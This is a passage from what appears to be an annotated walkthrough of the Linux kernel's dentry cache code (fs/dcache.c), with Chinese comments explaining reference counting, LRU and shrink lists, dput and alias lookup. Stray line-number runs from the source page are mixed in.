DCACHE_LRU_LIST; // 增加当前CPU的nr_dentry_unused计数器的值 this_cpu_inc(nr_dentry_unused); // 如果dentry是负的（表示不存在的文件或目录），增加当前CPU的nr_dentry_negative计数器的值 if (d_is_negative(dentry)) this_cpu_inc(nr_dentry_negative); // 向dentry所属的超级块的s_dentry_lru列表添加dentry的d_lru节点 // 将dentry添加到超级块的LRU列表中 WARN_ON_ONCE(!list_lru_add(&amp;dentry-&gt;d_sb-&gt;s_dentry_lru, &amp;dentry-&gt;d_lru));&#125;// 从LRU列表中删除dentrystatic void d_lru_del(struct dentry *dentry)&#123; // 确保d_flags的值为DCACHE_LRU_LIST，表示dentry在LRU列表中 D_FLAG_VERIFY(dentry, DCACHE_LRU_LIST); // 清除DCACHE_LRU_LIST位，表示dentry不再在LRU列表中 dentry-&gt;d_flags &amp;= ~DCACHE_LRU_LIST; // 减少当前CPU的nr_dentry_unused计数器的值 this_cpu_dec(nr_dentry_unused); // 如果dentry是负的（表示不存在的文件或目录），减少当前CPU的nr_dentry_negative计数器的值 if (d_is_negative(dentry)) this_cpu_dec(nr_dentry_negative); // 从dentry所属的超级块的s_dentry_lru列表中删除dentry的d_lru节点 // 从超级块的LRU列表中删除dentry WARN_ON_ONCE(!list_lru_del(&amp;dentry-&gt;d_sb-&gt;s_dentry_lru, &amp;dentry-&gt;d_lru));&#125;// 从收缩列表中删除dentrystatic void d_shrink_del(struct dentry *dentry)&#123; // 确保d_flags的值为DCACHE_SHRINK_LIST和DCACHE_LRU_LIST，表示dentry在收缩列表中 D_FLAG_VERIFY(dentry, DCACHE_SHRINK_LIST | DCACHE_LRU_LIST); // 从dentry的d_lru节点所在的链表中删除dentry // 清除DCACHE_SHRINK_LIST和DCACHE_LRU_LIST位，表示dentry不再在收缩列表和LRU列表中 list_del_init(&amp;dentry-&gt;d_lru); dentry-&gt;d_flags &amp;= ~(DCACHE_SHRINK_LIST | DCACHE_LRU_LIST); // 减少当前CPU的nr_dentry_unused计数器的值 this_cpu_dec(nr_dentry_unused);&#125;// 将dentry添加到收缩列表中static void d_shrink_add(struct dentry *dentry, struct list_head *list)&#123; // 确保d_flags的值为0，即未设置DCACHE_LRU_LIST和DCACHE_SHRINK_LIST位 D_FLAG_VERIFY(dentry, 0); // 将dentry的d_lru节点添加到指定的链表中 list_add(&amp;dentry-&gt;d_lru, list); // 设置DCACHE_SHRINK_LIST和DCACHE_LRU_LIST位，表示dentry在收缩列表和LRU列表中 dentry-&gt;d_flags |= DCACHE_SHRINK_LIST | DCACHE_LRU_LIST; // 增加当前CPU的nr_dentry_unused计数器的值 this_cpu_inc(nr_dentry_unused);&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869/* * 这些函数只能在全局 LRU 锁定期间调用，即在释放 LRU 列表的回调函数中。 * 函数 `d_lru_isolate` 将给定的 dentry 从 LRU 列表中移除，而函数 `d_lru_shrink_move` 则将其移动到指定的私有列表中。 */static void d_lru_isolate(struct list_lru_one *lru, struct dentry *dentry)&#123; // 确保 dentry 的标志位中包含 DCACHE_LRU_LIST D_FLAG_VERIFY(dentry, DCACHE_LRU_LIST); // 清除 dentry 的标志位 DCACHE_LRU_LIST dentry-&gt;d_flags &amp;= ~DCACHE_LRU_LIST; // 减少未使用的 dentry 的计数器 this_cpu_dec(nr_dentry_unused); // 如果 dentry 是负面的（不存在的），则减少负面 dentry 的计数器 if (d_is_negative(dentry)) this_cpu_dec(nr_dentry_negative); // 将 dentry 从 LRU 列表中隔离出来 list_lru_isolate(lru, &amp;dentry-&gt;d_lru);&#125;static void d_lru_shrink_move(struct list_lru_one *lru, struct dentry *dentry, struct list_head *list)&#123; // 确保 dentry 的标志位中包含 DCACHE_LRU_LIST D_FLAG_VERIFY(dentry, DCACHE_LRU_LIST); // 将 dentry 的标志位设置为 DCACHE_SHRINK_LIST dentry-&gt;d_flags |= DCACHE_SHRINK_LIST; // 如果 dentry 是负面的（不存在的），则减少负面 dentry 的计数器 if (d_is_negative(dentry)) this_cpu_dec(nr_dentry_negative); // 将 dentry 从 LRU 列表中移动到指定的列表中 list_lru_isolate_move(lru, &amp;dentry-&gt;d_lru, list);&#125;static void ___d_drop(struct dentry *dentry)&#123; struct hlist_bl_head *b; /* * 哈希的 dentry 通常位于 dentry 哈希表中， * 但是通过 d_obtain_root 新分配的 dentry 例外， * 它们总是 IS_ROOT 的： */ if (unlikely(IS_ROOT(dentry))) // 如果 dentry 是根节点，则使用 s_roots 作为哈希表头部 b = &amp;dentry-&gt;d_sb-&gt;s_roots; else // 否则，根据 dentry 的哈希值确定哈希表头部 b = d_hash(dentry-&gt;d_name.hash); // 对哈希表头部进行加锁 hlist_bl_lock(b); // 从哈希表中删除 dentry __hlist_bl_del(&amp;dentry-&gt;d_hash); // 解锁哈希表头部 hlist_bl_unlock(b);&#125;void __d_drop(struct dentry *dentry)&#123; // 如果 dentry 不是未哈希的（已经在哈希表中） if (!d_unhashed(dentry)) &#123; // 执行真正的删除操作 ___d_drop(dentry); // 将 dentry 的 d_hash.pprev 设置为 NULL dentry-&gt;d_hash.pprev = NULL; // 使 dentry 的 d_seq 失效 write_seqcount_invalidate(&amp;dentry-&gt;d_seq); &#125;&#125;EXPORT_SYMBOL(__d_drop); 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354/** * d_drop - 删除一个 dentry * @dentry: 要删除的 dentry * * d_drop() 从父级 dentry 的哈希表中取消哈希，这样就无法通过 VFS 查找找到它了。 * 注意，这与删除 dentry 不同 - d_delete() 会尝试标记 dentry 为负面（negative）， * 从而进行一次成功的负面查找，而 d_drop() 只会使缓存查找失败。 * * d_drop() 主要用于希望出于某种原因使 dentry 失效的操作（如 NFS 超时或 autofs 删除）。 * * __d_drop 需要 dentry-&gt;d_lock 锁定。 * * ___d_drop 不标记 dentry 为 &quot;unhashed&quot; * （dentry-&gt;d_hash.pprev 将是 LIST_POISON2，而不是 NULL）。 */void d_drop(struct dentry *dentry)&#123; spin_lock(&amp;dentry-&gt;d_lock); __d_drop(dentry); spin_unlock(&amp;dentry-&gt;d_lock);&#125;EXPORT_SYMBOL(d_drop);static inline void dentry_unlist(struct dentry *dentry, struct dentry *parent)&#123; struct dentry *next; /* * 通知 d_walk() 和 shrink_dentry_list()，我们不再附加到 dentry 树上 */ dentry-&gt;d_flags |= DCACHE_DENTRY_KILLED; if (unlikely(list_empty(&amp;dentry-&gt;d_child))) return; __list_del_entry(&amp;dentry-&gt;d_child); /* * 游标可能在子列表中移动。当我们是一个普通的列表成员时，这没关系 - * -&gt;d_child.next 将会被更新。然而，从现在开始，它不会被更新， * 对于像 d_walk() 这样的函数来说，这可能会导致一个不好的结果。 * 通常情况下，d_walk() 不关心游标的移动 - 父级的 -&gt;d_lock 会阻止移动， * 并且由于游标本身没有子节点，我们可以在不解锁父级的情况下完成遍历。 * 但是有一个例外 - 如果我们从一个在解锁后立即被删除的子节点上升， * 下一个兄弟节点是使用其 -&gt;d_child.next 中的值找到的。 * 如果 _那个_ 指向一个游标，并且在 d_walk() 重新获得 parent-&gt;d_lock 之前， * 游标被移动了（例如通过 lseek()），我们会跳过游标已经移过的所有内容。 * * 解决方案：确保在 -&gt;d_child.next 中留下的指针指向一个不会移动的东西。 * 即跳过游标。 */ while (dentry-&gt;d_child.next != &amp;parent-&gt;d_subdirs) &#123; next = list_entry(dentry-&gt;d_child.next, struct dentry, d_child); if (likely(!(next-&gt;d_flags &amp; DCACHE_DENTRY_CURSOR))) break; dentry-&gt;d_child.next = next-&gt;d_child.next; &#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990static void __dentry_kill(struct dentry *dentry)&#123; struct dentry *parent = NULL; // 初始化父级 dentry 为 NULL bool can_free = true; // 初始化可以释放标志为 true if (!IS_ROOT(dentry)) parent = dentry-&gt;d_parent; // 如果不是根节点，则获取父级 dentry /* * 现在，dentry 对于系统来说已经是无法恢复的死亡状态。 */ lockref_mark_dead(&amp;dentry-&gt;d_lockref); /* * 通过 d_prune 通知文件系统，此 dentry 即将被取消哈希和销毁。 */ if (dentry-&gt;d_flags &amp; DCACHE_OP_PRUNE) dentry-&gt;d_op-&gt;d_prune(dentry); if (dentry-&gt;d_flags &amp; DCACHE_LRU_LIST) &#123; if (!(dentry-&gt;d_flags &amp; DCACHE_SHRINK_LIST)) d_lru_del(dentry); &#125; /* 如果它在哈希表中，则将其移除 */ __d_drop(dentry); dentry_unlist(dentry, parent); if (parent) spin_unlock(&amp;parent-&gt;d_lock); if (dentry-&gt;d_inode) dentry_unlink_inode(dentry); else spin_unlock(&amp;dentry-&gt;d_lock); this_cpu_dec(nr_dentry); if (dentry-&gt;d_op &amp;&amp; dentry-&gt;d_op-&gt;d_release) dentry-&gt;d_op-&gt;d_release(dentry); spin_lock(&amp;dentry-&gt;d_lock); if (dentry-&gt;d_flags &amp; DCACHE_SHRINK_LIST) &#123; dentry-&gt;d_flags |= DCACHE_MAY_FREE; can_free = false; &#125; spin_unlock(&amp;dentry-&gt;d_lock); if (likely(can_free)) dentry_free(dentry); cond_resched();&#125;static struct dentry *__lock_parent(struct dentry *dentry)&#123; struct dentry *parent; rcu_read_lock(); spin_unlock(&amp;dentry-&gt;d_lock);again: parent = READ_ONCE(dentry-&gt;d_parent); spin_lock(&amp;parent-&gt;d_lock); /* * 我们不能盲目地锁定 dentry，直到确定不会违反锁定顺序。 * 任何对 dentry-&gt;d_parent 的更改必须在 parent-&gt;d_lock 锁定的情况下完成， * 所以上面的 spin_lock() 对于检查它是否仍然是我们的子节点足够了. */ if (unlikely(parent != dentry-&gt;d_parent)) &#123; spin_unlock(&amp;parent-&gt;d_lock); goto again; &#125; rcu_read_unlock(); if (parent != dentry) spin_lock_nested(&amp;dentry-&gt;d_lock, DENTRY_D_LOCK_NESTED); else parent = NULL; return parent;&#125;static inline struct dentry *lock_parent(struct dentry *dentry)&#123; struct dentry *parent = dentry-&gt;d_parent; if (IS_ROOT(dentry)) return NULL; if (likely(spin_trylock(&amp;parent-&gt;d_lock))) return parent; return __lock_parent(dentry);&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130static inline bool retain_dentry(struct dentry *dentry)&#123; // 检查是否在查找过程中 WARN_ON(d_in_lookup(dentry)); /* Unreachable? Get rid of it */ // 如果 dentry 不在哈希表中 if (unlikely(d_unhashed(dentry))) return false; // 如果 dentry 被断开连接 if (unlikely(dentry-&gt;d_flags &amp; DCACHE_DISCONNECTED)) return false; // 如果标记为需要执行删除操作 if (unlikely(dentry-&gt;d_flags &amp; DCACHE_OP_DELETE)) &#123; // 调用文件系统特定的删除函数 if (dentry-&gt;d_op-&gt;d_delete(dentry)) return false; &#125; // 如果标记为不缓存 if (unlikely(dentry-&gt;d_flags &amp; DCACHE_DONTCACHE)) return false; /* retain; LRU fodder */ // 引用计数减一 dentry-&gt;d_lockref.count--; // 如果不在 LRU 列表中 if (unlikely(!(dentry-&gt;d_flags &amp; DCACHE_LRU_LIST))) // 添加到 LRU 列表 d_lru_add(dentry); // 如果没有被引用 else if (unlikely(!(dentry-&gt;d_flags &amp; DCACHE_REFERENCED))) // 标记为已引用 dentry-&gt;d_flags |= DCACHE_REFERENCED; return true;&#125;void d_mark_dontcache(struct inode *inode)&#123; struct dentry *de; spin_lock(&amp;inode-&gt;i_lock); // 遍历 inode 的 dentry 链表 hlist_for_each_entry(de, &amp;inode-&gt;i_dentry, d_u.d_alias) &#123; spin_lock(&amp;de-&gt;d_lock); // 标记为不缓存 de-&gt;d_flags |= DCACHE_DONTCACHE; spin_unlock(&amp;de-&gt;d_lock); &#125; // inode 标记为不缓存 inode-&gt;i_state |= I_DONTCACHE; spin_unlock(&amp;inode-&gt;i_lock);&#125;EXPORT_SYMBOL(d_mark_dontcache); // 导出符号，供其他模块使用/* * Finish off a dentry we&#x27;ve decided to kill. * dentry-&gt;d_lock must be held, returns with it unlocked. * Returns dentry requiring refcount drop, or NULL if we&#x27;re done. */static struct dentry *dentry_kill(struct dentry *dentry) __releases(dentry-&gt;d_lock)&#123; struct inode *inode = dentry-&gt;d_inode; struct dentry *parent = NULL; // 如果 inode 存在且无法获取锁，则跳转到 slow_positive 标签处 if (inode &amp;&amp; unlikely(!spin_trylock(&amp;inode-&gt;i_lock))) goto slow_positive; // 如果不是根节点 if (!IS_ROOT(dentry)) &#123; parent = dentry-&gt;d_parent; // 如果无法获取父级 dentry 的锁 if (unlikely(!spin_trylock(&amp;parent-&gt;d_lock))) &#123; // 获取父级 dentry 的锁 parent = __lock_parent(dentry); // 如果 inode 存在或者 dentry-&gt;d_inode 为空 if (likely(inode || !dentry-&gt;d_inode)) goto got_locks; // negative that became positive if (parent) spin_unlock(&amp;parent-&gt;d_lock); inode = dentry-&gt;d_inode; goto slow_positive; &#125; &#125; // 执行真正的 dentry 销毁操作 __dentry_kill(dentry); return parent;slow_positive: spin_unlock(&amp;dentry-&gt;d_lock); spin_lock(&amp;inode-&gt;i_lock); spin_lock(&amp;dentry-&gt;d_lock); // 获取父级 dentry 的锁 parent = lock_parent(dentry);got_locks: // 如果 dentry 引用计数不为1 if (unlikely(dentry-&gt;d_lockref.count != 1)) &#123; dentry-&gt;d_lockref.count--; &#125; // 如果不保留该 dentry else if (likely(!retain_dentry(dentry))) &#123; // 执行真正的 dentry 销毁操作 __dentry_kill(dentry); return parent; &#125; // we are keeping it, after all if (inode) spin_unlock(&amp;inode-&gt;i_lock); if (parent) spin_unlock(&amp;parent-&gt;d_lock); spin_unlock(&amp;dentry-&gt;d_lock); return NULL;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192/* * 尝试无锁的 dput() 操作，并返回是否成功。 * * 如果不成功，我们返回 false，并已经获取了 dentry 锁。 * * 调用者需要持有 RCU 读锁，以确保即使引用计数降至零，dentry 仍然存在！ */static inline bool fast_dput(struct dentry *dentry)&#123; int ret; unsigned int d_flags; /* * 如果存在 d_op-&gt;d_delete() 操作，我们不应该让 dentry 计数降至零，因此使用 &quot;put_or_lock&quot;。 */ if (unlikely(dentry-&gt;d_flags &amp; DCACHE_OP_DELETE)) return lockref_put_or_lock(&amp;dentry-&gt;d_lockref); /* * .. 否则，我们可以尝试仅仅减少 lockref。 */ ret = lockref_put_return(&amp;dentry-&gt;d_lockref); /* * 如果 lockref_put_return() 由于其他人持有锁而失败， * 快速路径失败。我们需要获取锁，然后再次检查计数。 */ if (unlikely(ret &lt; 0)) &#123; spin_lock(&amp;dentry-&gt;d_lock); if (dentry-&gt;d_lockref.count &gt; 1) &#123; dentry-&gt;d_lockref.count--; spin_unlock(&amp;dentry-&gt;d_lock); return true; &#125; return false; &#125; /* * 如果我们不是最后一个引用，我们完成了。 */ if (ret) return true; /* * 小心，小心。引用计数降至零，但我们没有持有 dentry 锁， * 因此其他人可能再次获取它，并进行另一个 dput()， * 我们不能与之竞争。 * * 然而，有一种非常特殊且常见的情况，我们不关心， * 因为没有任何操作要执行：dentry 仍然在哈希表中， * 没有 &#x27;delete&#x27; 操作，它已经被引用并且已经在 LRU 列表中。 * * 注意！由于我们没有加锁，这些值不是 &quot;稳定的&quot;。 * 但是，只要在我们释放引用之后的某个时刻， * dentry 被哈希并且标志具有正确的值就足够了。 * 其他的 dentry 使用者可能重新获取对 dentry 的引用并更改它， * 但是我们的工作已经完成 - 我们可以保留具有零引用计数的 dentry。 * * 然而，有两种情况下我们应该销毁 dentry。 * 1. 当断开连接的 dentry 的引用计数达到零时，立即释放。 * 2. 如果不应缓存 dentry，则释放它们。 */ smp_rmb(); d_flags = READ_ONCE(dentry-&gt;d_flags); d_flags &amp;= DCACHE_REFERENCED | DCACHE_LRU_LIST | DCACHE_DISCONNECTED | DCACHE_DONTCACHE; /* 没有要执行的操作？释放引用计数就是我们所需要的？ */ if (d_flags == (DCACHE_REFERENCED | DCACHE_LRU_LIST) &amp;&amp; !d_unhashed(dentry)) return true; /* * 不是快速常规情况？获取锁。我们已经减少了引用计数， * 但在获取锁之后，我们需要重新检查情况。 */ spin_lock(&amp;dentry-&gt;d_lock); /* * 是否有其他人在此期间获取了对它的引用，我们不再是最后一个用户？ * 或者，其他人可能已经销毁它并标记为无效。无论哪种情况，我们都不需要做其他操作。 */ if (dentry-&gt;d_lockref.count) &#123; spin_unlock(&amp;dentry-&gt;d_lock); return true; &#125; /* * 重新获取我们乐观地释放的引用。我们持有锁，并且刚刚测试过计数为零，因此我们可以将其设置为1。 */ dentry-&gt;d_lockref.count = 1; return false;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354// dput - 释放一个dentry// @dentry: 要释放的dentry// 释放一个dentry。这将会降低使用计数，如果适当的话，// 会调用dentry的unlink方法，同时将其从队列中移除，并释放其资源。// 如果父dentry也被安排释放，它们也可能现在被删除。void dput(struct dentry *dentry)&#123; while (dentry) &#123; might_sleep(); // 可能会使当前任务进入睡眠状态 rcu_read_lock(); // 读取RCU锁 if (likely(fast_dput(dentry))) &#123; // 如果能快速释放dentry rcu_read_unlock(); // 解锁RCU return; &#125; // 慢速情况：此时已经持有dentry锁 rcu_read_unlock(); // 解锁RCU if (likely(retain_dentry(dentry))) &#123; // 如果能保留dentry spin_unlock(&amp;dentry-&gt;d_lock); // 解锁dentry return; &#125; dentry = dentry_kill(dentry); // 杀死dentry &#125;&#125;EXPORT_SYMBOL(dput); // 导出dput符号static void __dput_to_list(struct dentry *dentry, struct list_head list)__must_hold(&amp;dentry-&gt;d_lock) // 必须持有dentry锁&#123; if (dentry-&gt;d_flags &amp; DCACHE_SHRINK_LIST) &#123; // 如果dentry在收缩列表中 --dentry-&gt;d_lockref.count; // 减少dentry的锁引用计数 &#125; else &#123; if (dentry-&gt;d_flags &amp; DCACHE_LRU_LIST) // 如果dentry在LRU列表中 d_lru_del(dentry); // 从LRU列表中删除dentry if (!--dentry-&gt;d_lockref.count) // 如果dentry的锁引用计数降为0 d_shrink_add(dentry, list); // 将dentry添加到收缩列表中 &#125;&#125;void dput_to_list(struct dentry *dentry, struct list_head *list)&#123; rcu_read_lock(); // 读取RCU锁 if (likely(fast_dput(dentry))) &#123; // 如果能快速释放dentry rcu_read_unlock(); // 解锁RCU return; &#125; rcu_read_unlock(); // 解锁RCU if (!retain_dentry(dentry)) // 如果不能保留dentry __dput_to_list(dentry, list); // 将dentry添加到列表中 spin_unlock(&amp;dentry-&gt;d_lock); // 解锁dentry&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354/* This must be called with d_lock held *//* 必须在持有 d_lock 锁的情况下调用 */static inline void __dget_dlock(struct dentry *dentry)&#123; dentry-&gt;d_lockref.count++;&#125;static inline void __dget(struct dentry *dentry)&#123; lockref_get(&amp;dentry-&gt;d_lockref);&#125;/* 获取父目录的 dentry 结构体 */struct dentry *dget_parent(struct dentry *dentry)&#123; int gotref; struct dentry *ret; unsigned seq; /* * Do optimistic parent lookup without any * locking. */ rcu_read_lock(); seq = raw_seqcount_begin(&amp;dentry-&gt;d_seq); /* 开始读取序列计数器 */ ret = READ_ONCE(dentry-&gt;d_parent); /* 读取父目录的 dentry */ gotref = lockref_get_not_zero(&amp;ret-&gt;d_lockref); /* 获取父目录的引用计数 */ rcu_read_unlock(); if (likely(gotref)) &#123; if (!read_seqcount_retry(&amp;dentry-&gt;d_seq, seq)) /* 检查序列计数器是否正确，如果不正确则重试 */ return ret; /* 返回父目录的 dentry */ dput(ret); /* 减少父目录的引用计数 */ &#125;repeat: /* * Don&#x27;t need rcu_dereference because we re-check it was correct under * the lock. */ rcu_read_lock(); ret = dentry-&gt;d_parent; /* 重新读取父目录的 dentry */ spin_lock(&amp;ret-&gt;d_lock); /* 获取父目录的锁 */ if (unlikely(ret != dentry-&gt;d_parent)) &#123; /* 检查父目录的 dentry 是否发生变化 */ spin_unlock(&amp;ret-&gt;d_lock); rcu_read_unlock(); goto repeat; /* 如果发生变化，则重试 */ &#125; rcu_read_unlock(); BUG_ON(!ret-&gt;d_lockref.count); /* 检查父目录的引用计数是否为零 */ ret-&gt;d_lockref.count++; /* 增加父目录的引用计数 */ spin_unlock(&amp;ret-&gt;d_lock); /* 释放父目录的锁 */ return ret; /* 返回父目录的 dentry */&#125;EXPORT_SYMBOL(dget_parent); /* 导出 dget_parent 函数，使其可被其他模块使用 */ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748static struct dentry * __d_find_any_alias(struct inode *inode)&#123; struct dentry *alias; if (hlist_empty(&amp;inode-&gt;i_dentry)) return NULL; alias = hlist_entry(inode-&gt;i_dentry.first, struct dentry, d_u.d_alias); __dget(alias); /* 增加别名的引用计数 */ return alias; /* 返回别名的 dentry */&#125;/** * d_find_any_alias - find any alias for a given inode * @inode: inode to find an alias for * * If any aliases exist for the given inode, take and return a * reference for one of them. If no aliases exist, return %NULL. *//* 查找给定 inode 的任何别名 */struct dentry *d_find_any_alias(struct inode *inode)&#123; struct dentry *de; spin_lock(&amp;inode-&gt;i_lock); /* 获取 inode 的锁 */ de = __d_find_any_alias(inode); /* 查找任何别名的 dentry */ spin_unlock(&amp;inode-&gt;i_lock); /* 释放 inode 的锁 */ return de; /* 返回找到的别名的 dentry */&#125;EXPORT_SYMBOL(d_find_any_alias); /* 导出 d_find_any_alias 函数，使其可被其他模块使用 */static struct dentry *__d_find_alias(struct inode *inode)&#123; struct dentry *alias; if (S_ISDIR(inode-&gt;i_mode)) return __d_find_any_alias(inode); /* 对于目录类型的 inode，查找任何别名的 dentry */ hlist_for_each_entry(alias, &amp;inode-&gt;i_dentry, d_u.d_alias) &#123; spin_lock(&amp;alias-&gt;d_lock); /* 获取别名的锁 */ if (!d_unhashed(alias)) &#123; /* 检查别名是否已从哈希表中移除 */ __dget_dlock(alias); /* 增加别名的引用计数 */ spin_unlock(&amp;alias-&gt;d_lock); /* 释放别名的锁 */ return alias; /* 返回找到的别名的 dentry */ &#125; spin_unlock(&amp;alias-&gt;d_lock); /* 释放别名的锁 */ &#125; return NULL; /* 如果没有找到任何别名，则返回 NULL */&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273/** * d_find_alias - 获取 inode 的哈希别名 * @inode: 目标 inode * * 如果 inode 有一个哈希别名，或者是一个目录并且有任何别名， * 获取并返回别名的引用。否则返回 NULL。 * 注意，如果 inode 是一个目录，它只能有一个别名， * 只有当它没有子目录，或者是文件系统的根目录，或者是目录被重命名且 d_revalidate 是第一个 vfs 操作来注意到时，它才能没有哈希别名。 * * 如果 inode 有 IS_ROOT、DCACHE_DISCONNECTED 别名，则优先选择其他哈希别名。 */struct dentry *d_find_alias(struct inode *inode)&#123; struct dentry *de = NULL; if (!hlist_empty(&amp;inode-&gt;i_dentry)) &#123; spin_lock(&amp;inode-&gt;i_lock); /* 获取 inode 的锁 */ de = __d_find_alias(inode); /* 查找 inode 的别名 */ spin_unlock(&amp;inode-&gt;i_lock); /* 释放 inode 的锁 */ &#125; return de; /* 返回找到的别名的 dentry */&#125;EXPORT_SYMBOL(d_find_alias); /* 导出 d_find_alias 函数，使其可被其他模块使用 *//* * 调用者必须持有 rcu_read_lock()，并确保在 rcu_read_unlock() 之前 inode 不会被释放。 */struct dentry *d_find_alias_rcu(struct inode *inode)&#123; struct hlist_head *l = &amp;inode-&gt;i_dentry; struct dentry *de = NULL; spin_lock(&amp;inode-&gt;i_lock); /* 获取 inode 的锁 */ // -&gt;i_dentry 和 -&gt;i_rcu 是放在一起的，但只有在设置了 I_FREEING 时才会使用后者，这意味着没有剩余的别名 if (likely(!(inode-&gt;i_state &amp; I_FREEING) &amp;&amp; !hlist_empty(l))) &#123; if (S_ISDIR(inode-&gt;i_mode)) &#123; de = hlist_entry(l-&gt;first, struct dentry, d_u.d_alias); &#125; else &#123; hlist_for_each_entry(de, l, d_u.d_alias) if (!d_unhashed(de)) break; &#125; &#125; spin_unlock(&amp;inode-&gt;i_lock); /* 释放 inode 的锁 */ return de; /* 返回找到的别名的 dentry */&#125;/* * 尝试清除与该 inode 关联的 dentry。 * 警告：您必须拥有对 inode 的引用。 */void d_prune_aliases(struct inode *inode)&#123; struct dentry *dentry;restart: spin_lock(&amp;inode-&gt;i_lock); /* 获取 inode 的锁 */ hlist_for_each_entry(dentry, &amp;inode-&gt;i_dentry, d_u.d_alias) &#123; spin_lock(&amp;dentry-&gt;d_lock); /* 获取 dentry 的锁 */ if (!dentry-&gt;d_lockref.count) &#123; struct dentry *parent = lock_parent(dentry); /* 获取父目录的 dentry */ if (likely(!dentry-&gt;d_lockref.count)) &#123; __dentry_kill(dentry); /* 清除 dentry */ dput(parent); goto restart; &#125; if (parent) spin_unlock(&amp;parent-&gt;d_lock); /* 释放父目录的锁 */ &#125; spin_unlock(&amp;dentry-&gt;d_lock); /* 释放 dentry 的锁 */ &#125; spin_unlock(&amp;inode-&gt;i_lock); /* 释放 inode 的锁 */&#125;EXPORT_SYMBOL(d_prune_aliases); /* 导出 d_prune_aliases 函数，使其可被其他模块使用 */ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859/* * Lock a dentry from shrink list. * Called under rcu_read_lock() and dentry-&gt;d_lock; the former * guarantees that nothing we access will be freed under us. * Note that dentry is *not* protected from concurrent dentry_kill(), * d_delete(), etc. * * Return false if dentry has been disrupted or grabbed, leaving * the caller to kick it off-list. Otherwise, return true and have * that dentry&#x27;s inode and parent both locked. */static bool shrink_lock_dentry(struct dentry *dentry)&#123; // 检查dentry的引用计数是否非零，如果是，则返回false if (dentry-&gt;d_lockref.count) return false; struct inode *inode; struct dentry *parent; inode = dentry-&gt;d_inode; // 如果dentry的inode存在，并且无法获取inode的自旋锁，则释放dentry的自旋锁， // 获取inode的自旋锁，再获取dentry的自旋锁，然后检查dentry的引用计数是否非零， // 如果是，则跳转到out标签处，否则检查inode是否发生变化，如果是，则跳转到out标签处 if (inode &amp;&amp; unlikely(!spin_trylock(&amp;inode-&gt;i_lock))) &#123; spin_unlock(&amp;dentry-&gt;d_lock); spin_lock(&amp;inode-&gt;i_lock); spin_lock(&amp;dentry-&gt;d_lock); if (unlikely(dentry-&gt;d_lockref.count)) goto out; /* changed inode means that somebody had grabbed it */ if (unlikely(inode != dentry-&gt;d_inode)) goto out; &#125; parent = dentry-&gt;d_parent; // 如果dentry是根节点，或者可以获取到父节点的自旋锁，则返回true if (IS_ROOT(dentry) || likely(spin_trylock(&amp;parent-&gt;d_lock))) return true; spin_unlock(&amp;dentry-&gt;d_lock); spin_lock(&amp;parent-&gt;d_lock); // 检查父节点是否发生变化，如果是，则释放父节点的自旋锁，获取dentry的自旋锁，然后跳转到out标签处 if (unlikely(parent != dentry-&gt;d_parent)) &#123; spin_unlock(&amp;parent-&gt;d_lock); spin_lock(&amp;dentry-&gt;d_lock); goto out; &#125; spin_lock_nested(&amp;dentry-&gt;d_lock, DENTRY_D_LOCK_NESTED); // 检查dentry的引用计数是否非零，如果是，则返回true if (likely(!dentry-&gt;d_lockref.count)) return true; spin_unlock(&amp;parent-&gt;d_lock);out: if (inode) spin_unlock(&amp;inode-&gt;i_lock); return false;&#125; 1234567891011121314151617181920212223242526272829303132333435void shrink_dentry_list(struct list_head *list)&#123; while (!list_empty(list)) &#123; struct dentry *dentry, *parent; // 从列表中获取最后一个dentry，并获取其自旋锁 dentry = list_entry(list-&gt;prev, struct dentry, d_lru); spin_lock(&amp;dentry-&gt;d_lock); rcu_read_lock(); // 尝试锁定dentry的inode和父节点，并检查是否成功 if (!shrink_lock_dentry(dentry)) &#123; bool can_free = false; rcu_read_unlock(); // 从收缩列表中删除dentry d_shrink_del(dentry); // 检查dentry的引用计数是否小于0，以及是否可以释放 if (dentry-&gt;d_lockref.count &lt; 0) can_free = dentry-&gt;d_flags &amp; DCACHE_MAY_FREE; spin_unlock(&amp;dentry-&gt;d_lock); // 如果可以释放，则释放dentry if (can_free) dentry_free(dentry); continue; &#125; rcu_read_unlock(); // 从收缩列表中删除dentry d_shrink_del(dentry); parent = dentry-&gt;d_parent; // 如果dentry的父节点不是它自己，则将父节点添加回列表中 if (parent != dentry) __dput_to_list(parent, list); // 销毁dentry __dentry_kill(dentry); &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344static enum lru_status dentry_lru_isolate(struct list_head *item, struct list_lru_one *lru, spinlock_t *lru_lock, void *arg)&#123; struct list_head *freeable = arg; struct dentry *dentry = container_of(item, struct dentry, d_lru); // 尝试获取dentry的锁，如果获取失败则跳过 if (!spin_trylock(&amp;dentry-&gt;d_lock)) return LRU_SKIP; // 如果dentry有引用计数，表示仍在使用中，从LRU中移除 if (dentry-&gt;d_lockref.count) &#123; d_lru_isolate(lru, dentry); spin_unlock(&amp;dentry-&gt;d_lock); return LRU_REMOVED; &#125; // 如果dentry被标记为已引用，则清除标记并进行LRU旋转 if (dentry-&gt;d_flags &amp; DCACHE_REFERENCED) &#123; dentry-&gt;d_flags &amp;= ~DCACHE_REFERENCED; spin_unlock(&amp;dentry-&gt;d_lock); /* * 列表的移动由通用的LRU代码完成。此时，我们已经释放了dentry-&gt;d_lock， * 但保持了lru锁。这样做是安全的，因为即使同时持有两个锁，所有的列表移动 * 都受到lru锁的保护。 * * 这是因为所有的LRU管理函数都通过LRU API调用（如list_lru_add和list_lru_del） * 进行中介。此文件中的列表移动只会通过这些函数或通过从LRU API调用的回调函数 * （如此处的回调函数）进行。 * * 唯一的例外是像shrink_dentry_list这样的函数，以及首先检查DCACHE_SHRINK_LIST * 